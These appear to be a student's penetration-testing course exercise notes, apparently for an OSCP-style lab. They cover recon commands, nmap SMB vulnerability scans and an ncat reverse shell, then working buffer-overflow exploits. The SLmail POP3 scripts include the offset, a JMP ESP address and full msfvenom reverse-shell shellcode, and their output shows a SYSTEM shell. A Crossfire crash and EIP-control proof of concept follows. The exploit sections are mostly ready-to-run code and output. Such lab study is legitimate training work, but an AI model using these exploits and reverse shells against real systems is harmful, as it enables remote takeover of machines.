TODO:
2.3.5 - Exercises (Wireshark)
2.4.3 - Exercises (TCPDump)
4.4.1 - Exercise (Python code, SMTP test)
5.2.2 - Exercises


https://pentest.training/virtualmachines.php



## 1. Getting Comfortable with Kali Linux

### 1.1.4 - Exercises
(Reporting is not required for these exercises)

### 1.2.4 - Exercises
(Reporting is not required for these exercises)

### 1.4.3 - Exercises
1. Research Bash loops and write a short script to perform a ping sweep of your current subnet.

  ```
  root@kali:~# for i in {1..254}; do ping -c 1 10.11.1.$i; done
  PING 10.11.1.1 (10.11.1.1) 56(84) bytes of data.
  From 10.11.0.236 icmp_seq=1 Destination Host Unreachable

  --- 10.11.1.1 ping statistics ---
  1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms

  PING 10.11.1.2 (10.11.1.2) 56(84) bytes of data.
  From 10.11.0.236 icmp_seq=1 Destination Host Unreachable

  --- 10.11.1.2 ping statistics ---
  1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms

  PING 10.11.1.3 (10.11.1.3) 56(84) bytes of data.
  From 10.11.0.236 icmp_seq=1 Destination Host Unreachable

  --- 10.11.1.3 ping statistics ---
  1 packets transmitted, 0 received, +1 errors, 100% packet loss, time 0ms

  PING 10.11.1.4 (10.11.1.4) 56(84) bytes of
  [...]
  ```

2. Try to do the above exercise with a higher-level scripting language such as Python, Perl, or Ruby.

```Python
  from subprocess import call

  for i in range(1,254):
    ip = "10.11.1.%d" %i
    call(["ping", "-c 1", ip])
```

3. Ensure you understand the difference between directing output from a command to a file (>) and output from a command as input to another command (|).

  `# echo ns1.ns1.megacorpone.com > nameservers.txt`
  `# echo ns1.ns1.megacorpone.com >> nameservers.txt`
  `# cat nameservers.txt | grep nameserver`


## 2. - The Essential Tools

### 2.1.5 - Exercises
(Reporting is not required for these exercises)

### 2.2.1 - Exercises

1. Use Ncat to create an encrypted reverse shell from your Windows system to your Kali machine

  `C:\> ncat.exe -v 10.11.11.236 4444 --ssl --exec cmd.exe`
  `root@kali:~# ncat -vl 4444 --ssl --allow 10.11.11.86`

2. Create an encrypted bind shell on your Windows VM. Try to connect to it from Kali without encryption. Does it still work?
  No, ncat does not allow connection.

3. Make an unencrypted Ncat bind shell on your Windows system. Connect to the shell using Netcat. Does it work?
  Yes


### 2.3.5 - Exercises
1. Use Wireshark to capture the network activity of Netcat connecting to port 110 (POP3) and attempting a login.
2. Read and understand the output. Where is the session three-way handshake? Where is the session closed?
3. Follow the TCP stream to read the login attempt.
4. Use the display filter to only see the port 110 traffic
5. Re-run the capture, this time using the capture filter to only collect port 110

### 2.4.3 - Exercises
1. Use tcpdump to recreate the wireshark exercise of capturing traffic on port 110.
2. Use the -X flag to view the content of the packet. If data is truncated, investigate how the -s flag might help.


## 3. - Passive Information Gathering

### 3.2.1 - Exercise
1. Use theharvester to enumerate email addresses belonging to the organization you chose in the previous exercises
  `root@kali:~/oscp/evidence# theharvester -d trustwave.com -b google`
  `root@kali:~/oscp/evidence# theharvester -d trustwave.com -b all`

2. Experiment with different data sources (-b). Which work best for you?
  Google


### 3.3.3 - Exercise
1. Use the whois tool in Kali to identify the name servers of your target organization

  ```
  root@kali:~/oscp/evidence# whois trustwave.com

  Whois Server Version 2.0

  Domain names in the .com and .net domains can now be registered
  with many different competing registrars. Go to http://www.internic.net
  for detailed information.

     Domain Name: TRUSTWAVE.COM
     Registrar: GODADDY.COM, LLC
     Sponsoring Registrar IANA ID: 146
     Whois Server: whois.godaddy.com
     Referral URL: http://www.godaddy.com
     Name Server: A1-143.AKAM.NET
     Name Server: A11-66.AKAM.NET
     Name Server: A12-67.AKAM.NET
     Name Server: A24-64.AKAM.NET
     Name Server: A28-65.AKAM.NET
     Name Server: A9-66.AKAM.NET
     Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited
     Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited
     Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
     Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited
     Updated Date: 19-mar-2016
     Creation Date: 12-apr-2000
     Expiration Date: 12-apr-2024
     ```

## 4. Active Information Gathering
### 4.1.7

1. Find the DNS servers for the megacorpone.com domain
  ```
    root@kali:~# dig -t ns megacorpone.com +noall +answer

    ; <<>> DiG 9.10.3-P4-Debian <<>> -t ns megacorpone.com +noall +answer
    ;; global options: +cmd
    megacorpone.com.        259200  IN      NS      ns1.megacorpone.com.
    megacorpone.com.        259200  IN      NS      ns2.megacorpone.com.
    megacorpone.com.        259200  IN      NS      ns3.megacorpone.com.
  ```

  - ns1.megacorpone.com
  - ns2.megacorpone.com
  - ns3.megacorpone.com

2. Write a small Bash script to attempt a zone transfer from megacorpone.com

  ```
  root@kali:~/oscp/exercises# for n in `host -t ns megacorpone.com | cut -d " " -f 4`; do host -l megacorpone.com $n; done
  Using domain server:
  Name: ns1.megacorpone.com
  Address: 38.100.193.70#53
  Aliases:

  Host megacorpone.com not found: 5(REFUSED)
  ; Transfer failed.
  Using domain server:
  Name: ns2.megacorpone.com
  Address: 38.100.193.80#53
  Aliases:

  megacorpone.com name server ns1.megacorpone.com.
  megacorpone.com name server ns2.megacorpone.com.
  megacorpone.com name server ns3.megacorpone.com.
  admin.megacorpone.com has address 38.100.193.83
  beta.megacorpone.com has address 38.100.193.69
  fs1.megacorpone.com has address 38.100.193.82
  intranet.megacorpone.com has address 38.100.193.81
  mail.megacorpone.com has address 38.100.193.84
  mail2.megacorpone.com has address 38.100.193.73
  ns1.megacorpone.com has address 38.100.193.70
  ns2.megacorpone.com has address 38.100.193.80
  ns3.megacorpone.com has address 38.100.193.90
  router.megacorpone.com has address 38.100.193.91
  siem.megacorpone.com has address 38.100.193.89
  snmp.megacorpone.com has address 38.100.193.85
  support.megacorpone.com has address 173.246.47.170
  syslog.megacorpone.com has address 38.100.193.66
  test.megacorpone.com has address 38.100.193.67
  vpn.megacorpone.com has address 38.100.193.77
  www.megacorpone.com has address 38.100.193.76
  www2.megacorpone.com has address 38.100.193.79
  Using domain server:
  Name: ns3.megacorpone.com
  Address: 38.100.193.90#53
  Aliases:

  Host megacorpone.com not found: 5(REFUSED)
  ; Transfer failed.
  ```

3. Use dnsrecon to attempt a zone transfer from megacorpone.com
  ```
  root@kali:~# dnsrecon -d  megacorpone.com
  [*] Performing General Enumeration of Domain: megacorpone.com
  [-] DNSSEC is not configured for megacorpone.com
  [*]      SOA ns1.megacorpone.com 38.100.193.70
  [*]      NS ns2.megacorpone.com 38.100.193.80
  [*]      Bind Version for 38.100.193.80 9.8.1-P1
  [*]      NS ns3.megacorpone.com 38.100.193.90
  [*]      Bind Version for 38.100.193.90 9.8.1-P1
  [*]      NS ns1.megacorpone.com 38.100.193.70
  [*]      Bind Version for 38.100.193.70 9.8.2rc1-RedHat-9.8.2-0.17.rc1.el6_4.4
  [*]      MX spool.mail.gandi.net 217.70.184.6
  [*]      MX mail.megacorpone.com 38.100.193.84
  [*]      MX mail2.megacorpone.com 38.100.193.73
  [*]      MX fb.mail.gandi.net 217.70.184.163
  [*]      MX fb.mail.gandi.net 217.70.184.161
  [*]      MX fb.mail.gandi.net 217.70.184.162
  [*]      MX spool.mail.gandi.net 2001:4b98:c:521::6
  [*] Enumerating SRV Records
  [-] No SRV Records Found for megacorpone.com
  [*] 0 Records Found
  ```
### 4.2.8 - Exercises
1. Use nmap to conduct a ping sweep of your target IP range and save the output to a file, so that you can grep for hosts that are online.

  `# nmap -sn 10.11.1.0/24`
  ```
  # Nmap 7.40 scan initiated Mon Jun 19 23:10:26 2017 as: nmap -sn -oG /media/sf_assessments/oscp_lab2/evidence/nmap-sn-10.11.1.0_24-oG.txt 10.11.1.0/24
  Host: 10.11.1.5 ()	Status: Up
  Host: 10.11.1.7 ()	Status: Up
  Host: 10.11.1.8 ()	Status: Up
  Host: 10.11.1.10 ()	Status: Up
  Host: 10.11.1.13 ()	Status: Up
  Host: 10.11.1.14 ()	Status: Up
  Host: 10.11.1.22 ()	Status: Up
  Host: 10.11.1.24 ()	Status: Up
  Host: 10.11.1.31 ()	Status: Up
  Host: 10.11.1.35 ()	Status: Up
  Host: 10.11.1.39 ()	Status: Up
  Host: 10.11.1.44 ()	Status: Up
  Host: 10.11.1.49 ()	Status: Up
  Host: 10.11.1.50 ()	Status: Up
  Host: 10.11.1.71 ()	Status: Up
  Host: 10.11.1.72 ()	Status: Up
  Host: 10.11.1.73 ()	Status: Up
  Host: 10.11.1.115 ()	Status: Up
  Host: 10.11.1.116 ()	Status: Up
  Host: 10.11.1.125 ()	Status: Up
  Host: 10.11.1.128 ()	Status: Up
  Host: 10.11.1.133 ()	Status: Up
  Host: 10.11.1.136 ()	Status: Up
  Host: 10.11.1.141 ()	Status: Up
  Host: 10.11.1.145 ()	Status: Up
  Host: 10.11.1.146 ()	Status: Up
  Host: 10.11.1.202 ()	Status: Up
  Host: 10.11.1.209 ()	Status: Up
  Host: 10.11.1.217 ()	Status: Up
  Host: 10.11.1.218 ()	Status: Up
  Host: 10.11.1.219 ()	Status: Up
  Host: 10.11.1.220 ()	Status: Up
  Host: 10.11.1.221 ()	Status: Up
  Host: 10.11.1.223 ()	Status: Up
  Host: 10.11.1.226 ()	Status: Up
  Host: 10.11.1.227 ()	Status: Up
  Host: 10.11.1.229 ()	Status: Up
  Host: 10.11.1.230 ()	Status: Up
  Host: 10.11.1.234 ()	Status: Up
  Host: 10.11.1.237 ()	Status: Up
  Host: 10.11.1.238 ()	Status: Up
  Host: 10.11.1.247 ()	Status: Up
  Host: 10.11.1.251 ()	Status: Up
  Host: 10.11.1.252 ()	Status: Up
  # Nmap done at Mon Jun 19 23:10:36 2017 -- 256 IP addresses (44 hosts up) scanned in 10.10 seconds
```

2. Scan the IPs you found in exercise 1 for open webserver ports. Use nmap to find the web server and operating system versions.
  ```
  # for ip in `cat hosts_org.txt`; do nmap -Pn -n -p 80,443,8080,8000,10443 -O $ip; done
  ```

3. Use the NSE scripts to scan the servers in the labs which are running the SMB service.

  `# for ip in `cat hosts_org.txt`; do nmap -Pn -n -sT -p 445 --script=smb-enum* --open $ip; done > smb_445.txt`
  `# for ip in `cat hosts_org.txt`; do nmap -Pn -n -sU -sT -p U:137,T:139 --script=smb-enum* --open $ip; done > smb_137_9.txt`

4. Explore the various command line options that nmap offers while scanning an online host you discovered within your target IP range. Monitor the bandwidth usage changes for the different options. Weigh the use of collecting as much information as possible against the resources it takes to gather it.


### 4.3.4 - Exercises
1. Use Nmap to make a list of which SMB servers in the lab are running Windows.
  `# for ip in `cat hosts_org.txt`; do nmap -Pn -n -sT -sU -p T:139,445,U:137 --open $ip; done
> nmap_smb.txt`

2. Use NSE scripts to scan these systems for SMB vulnerabilities.
  `# for ip in `cat hosts_smb.txt`; do nmap -Pn -n -sT -p 139,445 --script smb-vuln* $ip --open> nmap_smb_vulns_$ip.txt; done`

3. Use nbtscan and enum4linux against these systems and identify the kinds of data you can obtain from different versions of Windows.
  See output


### 4.4.1 - Exercise

1. Search your target network range, and see if you can identify any systems that respond to the SMTP VRFY command.

```Python


```


### 4.5.4 - Exercises
1. Scan your target network with onesixtyone. Identify any SNMP servers.


2. Use snmpwalk and snmpcheck to gather information about the discovered
targets.



### 5.2.2 - Exercises
1. Use nmap scripts and OpenVAS to conduct targeted scans (against single hosts) against systems in your target network.
2. Account for the traffic using iptables. How many resources does scanning a single host require, in terms of network bandwidth, and time?
3. Consider the sort of vulnerabilities a scanner will identify. What are the limitations of the tool? Why?


## 6. Buffer Overflows

### 6.1.4 - Exercises
1. Fuzz SLmail and replicate the crash.
```
# python fuzzer1.py
Fuzzing PASS with 1 bytes
Fuzzing PASS with 100 bytes
Fuzzing PASS with 300 bytes
Fuzzing PASS with 500 bytes
Fuzzing PASS with 700 bytes
Fuzzing PASS with 900 bytes
Fuzzing PASS with 1100 bytes
Fuzzing PASS with 1300 bytes
Fuzzing PASS with 1500 bytes
Fuzzing PASS with 1700 bytes
Fuzzing PASS with 1900 bytes
Fuzzing PASS with 2100 bytes
Fuzzing PASS with 2300 bytes
Fuzzing PASS with 2500 bytes
Fuzzing PASS with 2700 bytes
Fuzzing PASS with 2900 bytes
Fuzzing PASS with 3100 bytes
Fuzzing PASS with 3300 bytes
Fuzzing PASS with 3500 bytes
Fuzzing PASS with 3700 bytes
Fuzzing PASS with 3900 bytes
Fuzzing PASS with 4100 bytes
Fuzzing PASS with 4300 bytes
Fuzzing PASS with 4500 bytes
Fuzzing PASS with 4700 bytes
Fuzzing PASS with 4900 bytes
Fuzzing PASS with 5100 bytes
Fuzzing PASS with 5300 bytes
Fuzzing PASS with 5500 bytes
Fuzzing PASS with 5700 bytes
Fuzzing PASS with 5900 bytes
```

2. Examine the memory in the stack, when SLmail crashes. What does it look like?
Consider how this might be useful.

EIP = 41414141
ESP = 009BA128
ESP is the position after EIP. Knowing where EIP is allows us to redirect program flow.


## 7. Win32 Buffer Overflow Exploitation

### 7.2.3 - Exercises
1. Write a standalone script to replicate the crash.
```Python
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#buffer = 'A' * 2700
buffer = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9'

try:
    print "\nSending evil buffer..."
    s.connect(('10.11.11.86',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```

2. Determine the offset of EIP for the data that is being sent.<br/>
2606

3. Update your standalone script to place a unique value into EIP, to ensure your
offsets are correct.

```Python
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
buffer = 'A' * 2606 + 'B' * 4 + 'C' * (2700-2606-4)
try:
    print "\nSending evil buffer..."
    s.connect(('10.11.11.86',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"

```


### 7.4.1 - Exercises
1. Identify the bad characters that cannot be included in the payload.<br/>
0x0A, 0x0D

2. Understand why these characters are not allowed. What does the hex translate to in ASCII?
0x0A = Line Feed<br/>
0x0D = Carriage Return


### 7.5.2 - Exercises
1. Identify a JMP ESP that is usable in the exploit.<br/>
JMP ESP found at 0x5f4a358f

2. Update your PoC to include the discovered JMP ESP, set a break point on it, and follow the execution.<br/>

```Python
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "C" * 390
try:
    print "\nSending evil buffer..."
    s.connect(('10.11.11.86',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"

# bad characters: \x0a\x0d
# JMP ESP found at 0x5f4a358f
```

### 7.7.1 - Exercises
1. Update your PoC to include a working payload.

```Python
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.126 LPORT=80 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
shellcode = (
"\xbb\x28\x2f\xb2\x53\xdb\xce\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x31\x5d\x12\x03\x5d\x12\x83\xc5\xd3\x50\xa6\xe9\xc4\x17"
"\x49\x11\x15\x78\xc3\xf4\x24\xb8\xb7\x7d\x16\x08\xb3\xd3\x9b"
"\xe3\x91\xc7\x28\x81\x3d\xe8\x99\x2c\x18\xc7\x1a\x1c\x58\x46"
"\x99\x5f\x8d\xa8\xa0\xaf\xc0\xa9\xe5\xd2\x29\xfb\xbe\x99\x9c"
"\xeb\xcb\xd4\x1c\x80\x80\xf9\x24\x75\x50\xfb\x05\x28\xea\xa2"
"\x85\xcb\x3f\xdf\x8f\xd3\x5c\xda\x46\x68\x96\x90\x58\xb8\xe6"
"\x59\xf6\x85\xc6\xab\x06\xc2\xe1\x53\x7d\x3a\x12\xe9\x86\xf9"
"\x68\x35\x02\x19\xca\xbe\xb4\xc5\xea\x13\x22\x8e\xe1\xd8\x20"
"\xc8\xe5\xdf\xe5\x63\x11\x6b\x08\xa3\x93\x2f\x2f\x67\xff\xf4"
"\x4e\x3e\xa5\x5b\x6e\x20\x06\x03\xca\x2b\xab\x50\x67\x76\xa4"
"\x95\x4a\x88\x34\xb2\xdd\xfb\x06\x1d\x76\x93\x2a\xd6\x50\x64"
"\x4c\xcd\x25\xfa\xb3\xee\x55\xd3\x77\xba\x05\x4b\x51\xc3\xcd"
"\x8b\x5e\x16\x41\xdb\xf0\xc9\x22\x8b\xb0\xb9\xca\xc1\x3e\xe5"
"\xeb\xea\x94\x8e\x86\x11\x7f\xbb\x5d\x19\x01\xd3\x63\x19\xfd"
"\x73\xed\xff\x97\x63\xbb\xa8\x0f\x1d\xe6\x22\xb1\xe2\x3c\x4f"
"\xf1\x69\xb3\xb0\xbc\x99\xbe\xa2\x29\x6a\xf5\x98\xfc\x75\x23"
"\xb4\x63\xe7\xa8\x44\xed\x14\x67\x13\xba\xeb\x7e\xf1\x56\x55"
"\x29\xe7\xaa\x03\x12\xa3\x70\xf0\x9d\x2a\xf4\x4c\xba\x3c\xc0"
"\x4d\x86\x68\x9c\x1b\x50\xc6\x5a\xf2\x12\xb0\x34\xa9\xfc\x54"
"\xc0\x81\x3e\x22\xcd\xcf\xc8\xca\x7c\xa6\x8c\xf5\xb1\x2e\x19"
"\x8e\xaf\xce\xe6\x45\x74\xfe\xac\xc7\xdd\x97\x68\x92\x5f\xfa"
"\x8a\x49\xa3\x03\x09\x7b\x5c\xf0\x11\x0e\x59\xbc\x95\xe3\x13"
"\xad\x73\x03\x87\xce\x51"
)

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
try:
    print "\nSending evil buffer..."
    s.connect(('10.11.11.86',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"

# bad characters: \x0a\x0d
# JMP ESP found at 0x5f4a358f
```

2. Obtain a shell from SLmail.

```
# nc -nvlp 80
listening on [any] 80 ...
connect to [10.11.0.126] from (UNKNOWN) [10.11.11.86] 49157
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files\SLmail\System>whoami
whoami
nt authority\system

C:\Program Files\SLmail\System>
```


### 7.8.1 - Exercises
1. Update the exploit so that SLmail still runs after exploitation.

``` Python
#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# # msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.126 LPORT=80 -f c -e x86/shikata_ga_nai -b "\x00\x0a\x0d" EXITFUNC=thread
shellcode = (
"\xb8\x89\xb1\x0e\x9e\xdb\xcb\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x52\x31\x45\x12\x03\x45\x12\x83\x4c\xb5\xec\x6b\xb2\x5e\x72"
"\x93\x4a\x9f\x13\x1d\xaf\xae\x13\x79\xa4\x81\xa3\x09\xe8\x2d"
"\x4f\x5f\x18\xa5\x3d\x48\x2f\x0e\x8b\xae\x1e\x8f\xa0\x93\x01"
"\x13\xbb\xc7\xe1\x2a\x74\x1a\xe0\x6b\x69\xd7\xb0\x24\xe5\x4a"
"\x24\x40\xb3\x56\xcf\x1a\x55\xdf\x2c\xea\x54\xce\xe3\x60\x0f"
"\xd0\x02\xa4\x3b\x59\x1c\xa9\x06\x13\x97\x19\xfc\xa2\x71\x50"
"\xfd\x09\xbc\x5c\x0c\x53\xf9\x5b\xef\x26\xf3\x9f\x92\x30\xc0"
"\xe2\x48\xb4\xd2\x45\x1a\x6e\x3e\x77\xcf\xe9\xb5\x7b\xa4\x7e"
"\x91\x9f\x3b\x52\xaa\xa4\xb0\x55\x7c\x2d\x82\x71\x58\x75\x50"
"\x1b\xf9\xd3\x37\x24\x19\xbc\xe8\x80\x52\x51\xfc\xb8\x39\x3e"
"\x31\xf1\xc1\xbe\x5d\x82\xb2\x8c\xc2\x38\x5c\xbd\x8b\xe6\x9b"
"\xc2\xa1\x5f\x33\x3d\x4a\xa0\x1a\xfa\x1e\xf0\x34\x2b\x1f\x9b"
"\xc4\xd4\xca\x0c\x94\x7a\xa5\xec\x44\x3b\x15\x85\x8e\xb4\x4a"
"\xb5\xb1\x1e\xe3\x5c\x48\xc9\x06\xaa\x52\x77\x7f\xae\x52\x87"
"\x2f\x27\xb4\xed\xdf\x61\x6f\x9a\x46\x28\xfb\x3b\x86\xe6\x86"
"\x7c\x0c\x05\x77\x32\xe5\x60\x6b\xa3\x05\x3f\xd1\x62\x19\x95"
"\x7d\xe8\x88\x72\x7d\x67\xb1\x2c\x2a\x20\x07\x25\xbe\xdc\x3e"
"\x9f\xdc\x1c\xa6\xd8\x64\xfb\x1b\xe6\x65\x8e\x20\xcc\x75\x56"
"\xa8\x48\x21\x06\xff\x06\x9f\xe0\xa9\xe8\x49\xbb\x06\xa3\x1d"
"\x3a\x65\x74\x5b\x43\xa0\x02\x83\xf2\x1d\x53\xbc\x3b\xca\x53"
"\xc5\x21\x6a\x9b\x1c\xe2\x8a\x7e\xb4\x1f\x23\x27\x5d\xa2\x2e"
"\xd8\x88\xe1\x56\x5b\x38\x9a\xac\x43\x49\x9f\xe9\xc3\xa2\xed"
"\x62\xa6\xc4\x42\x82\xe3"
)

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 8 + shellcode
try:
    print "\nSending evil buffer..."
    s.connect(('10.11.11.86',110))
    data = s.recv(1024)
    s.send('USER username' +'\r\n')
    data = s.recv(1024)
    s.send('PASS ' + buffer + '\r\n')
    print "\nDone!."
except:
    print "Could not connect to POP3!"

# bad characters: \x0a\x0d
# JMP ESP found at 0x5f4a358f
```

2. In the Tools folder on the Desktop of your Windows VM, there is a VulnServer.exe application. Using the proof of concept from the following forum post, develop a working exploit: https://forums.offensive-security.com/showthread.php?t=2231


### 8.2.1 - Exercise
1. Create a PoC that crashes the Crossfire server.

```Python
#!/usr/bin/python
import socket

host = "127.0.0.1"
crash="\x41" * 4379

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"

```

### 8.6.1 - Exercises
1. Update your POC so you have control of the EIP register.

```Python
#!/usr/bin/python
import socket

host = "127.0.0.1"
crash="\x41" * 4368 + "B" * 4 + "C" * 7

buffer = "\x11(setup sound " + crash + "\x90\x00#"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"


# At crash EIP = 46367046
# [*] Exact match at offset 4368
```

